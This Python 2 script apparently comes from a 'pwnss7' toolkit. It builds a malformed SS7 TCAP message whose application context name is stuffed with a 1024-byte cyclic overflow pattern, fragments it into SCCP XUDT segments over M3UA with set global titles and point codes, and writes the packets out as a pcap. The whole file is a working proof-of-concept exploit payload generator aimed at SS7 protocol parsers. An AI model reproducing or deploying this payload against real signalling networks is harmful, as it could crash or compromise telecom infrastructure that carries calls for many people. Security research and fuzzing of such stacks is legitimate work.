#!/usr/bin/env python2

import subprocess
import sys
from cStringIO import StringIO
from binascii import unhexlify
from itertools import islice
import string


# add pwnss7 directory to be able to import pwnss7 submodules
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))


from pwnss7.m3ua import encode_data
from pwnss7.sccp import encode_xudt
from pwnss7.ber import encode_ber, decode_ber, Asn1Obj, encode_integer
from pwnss7.util import cyclic, split_by, convert2pcap

# cyclic can be replaced by pwnlib's cyclic as well
cyclic_acn = cyclic(1024)

tcap = Asn1Obj(0x1, 1, 0x2, children=[
  Asn1Obj(0x1, 0, 0x8, value='/;F\x02'),
  Asn1Obj(0x1, 1, 0xb, children=[
    Asn1Obj(0x0, 1, 0x8, children=[
      Asn1Obj(0x0, 0, 0x6, value=cyclic_acn),
      Asn1Obj(0x2, 1, 0x0, children=[
        Asn1Obj(0x1, 1, 0x0, children=[
          Asn1Obj(0x2, 0, 0x0, value='\x07\x80'),
          Asn1Obj(0x2, 1, 0x1, children=[
            Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x00\x13\x02'),
          ]),
          Asn1Obj(0x2, 1, 0x1e, children=[
            Asn1Obj(0x0, 1, 0x8, children=[
              Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x01\x01\x01'),
              Asn1Obj(0x2, 1, 0x0, children=[
                Asn1Obj(0x2, 1, 0x0, children=[
                  Asn1Obj(0x2, 0, 0x0, value='\x96V\x05\x11$\x00i\x13\xf6'),
                ]),
              ]),
            ]),
          ]),
        ]),
      ]),
    ]),
  ]),
  Asn1Obj(0x1, 1, 0xc, children=[
    Asn1Obj(0x2, 1, 0x1, children=[
      Asn1Obj(0x0, 0, 0x2, value='\x01'),
      Asn1Obj(0x0, 0, 0x2, value=';'),
      Asn1Obj(0x0, 1, 0x10, children=[
        Asn1Obj(0x0, 0, 0x4, value='\x0f'),
        Asn1Obj(0x0, 0, 0x4, value='\xaa\x18\r\xa6\x82\xddl1\x19-6\xbb\xddF'),
        Asn1Obj(0x2, 0, 0x0, value="\x91rgAX'\xf2"),
      ]),
    ]),
  ]),
])


f = StringIO()
encode_ber(f, tcap)
encoded_tcap = f.getvalue()

xudt_size = 200
pkts = [frag for frag in split_by(encoded_tcap, xudt_size)]

CALLED_GT = unhexlify('12930011047228190600')
CALLING_GT = unhexlify('1206001104722819604106')

pkts[0] = encode_data(
  encode_xudt(
    pkts[0],
    1, len(pkts)-1, # first segment, one fragment remaining
    CALLED_GT, CALLING_GT,
  ),
  666, # originating point code
  1337,# destination point code
  0    # signalling link selection
)

for i in range(1, len(pkts)-1):
  pkts[i] = encode_data(
    encode_xudt(
      pkts[i],
      0, len(pkts)-i-1,
      CALLED_GT, CALLING_GT,
    ),
    666, # originating point code
    1337,# destination point code
    0    # signalling link selection
  )

pkts[-1] = encode_data(
  encode_xudt(
    pkts[-1],
    0, 0,
    CALLED_GT, CALLING_GT,
  ),
  666, # originating point code
  1337,# destination point code
  0    # signalling link selection
)

pcap = convert2pcap(pkts)
sys.stdout.write(pcap)
